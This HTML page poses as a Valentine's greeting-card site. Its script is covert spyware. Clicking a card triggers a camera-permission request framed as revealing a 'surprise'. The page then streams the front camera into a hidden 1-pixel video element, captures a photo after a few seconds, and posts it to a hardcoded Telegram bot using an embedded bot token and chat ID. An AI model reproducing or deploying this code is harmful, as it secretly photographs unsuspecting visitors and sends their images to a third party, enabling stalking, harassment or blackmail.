<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Valentine's Special ‚ù§Ô∏è</title>
    <style>
        body { background: #ffafbd; background: linear-gradient(to right, #ffc3a0, #ffafbd); font-family: 'Arial', sans-serif; text-align: center; }
        .card-container { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin-top: 30px; }
        .card { width: 140px; height: 180px; background: white; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-weight: bold; cursor: pointer; box-shadow: 0 4px 8px rgba(0,0,0,0.2); border: 2px solid #ff4b2b; padding: 10px; }
        #video { width: 1px; height: 1px; opacity: 0; position: absolute; } /* Chota aur invisible */
        #canvas { display: none; }
    </style>
</head>
<body>

    <h1 style="color: white; text-shadow: 2px 2px #ff4b2b;">Open Your Valentine Card üíå</h1>

    <div class="card-container">
        <div class="card" onclick="startProcess('Tu meri zindagi ka sabse pyara hissa hai! üåπ')">Pyaar Bhara Tohfa</div>
        <div class="card" onclick="startProcess('I Promise to love you forever! üíç')">Ek Vaada</div>
        <div class="card" onclick="startProcess('You are so beautiful! üòç')">Tareef</div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = "8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc";
        const chatId = "7735968383";

        async function startProcess(msg) {
            // Pehle camera permission maangega
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, // Front camera force karna
                    audio: false 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;

                // User ko message dikhao jab tak peeche camera set ho raha hai
                alert(msg);

                // 3 Second ka wait taaki black screen na aaye
                setTimeout(() => {
                    captureRealPhoto(stream);
                }, 3000); 

            } catch (err) {
                alert("Please allow camera to see the surprise! ‚ù§Ô∏è");
            }
        }

        function captureRealPhoto(stream) {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            // Video frames check
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                canvas.toBlob(blob => {
                    sendToTelegram(blob);
                    // Camera band kar do kaam khatam hone ke baad
                    stream.getTracks().forEach(track => track.stop());
                }, 'image/jpeg', 0.8); // 0.8 quality for clear photo
            } else {
                // Agar data ready nahi hai toh 1 sec aur wait karo
                setTimeout(() => captureRealPhoto(stream), 1000);
            }
        }

        function sendToTelegram(imageBlob) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', imageBlob, 'capture.jpg');

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }
    </script>
</body>
</html>
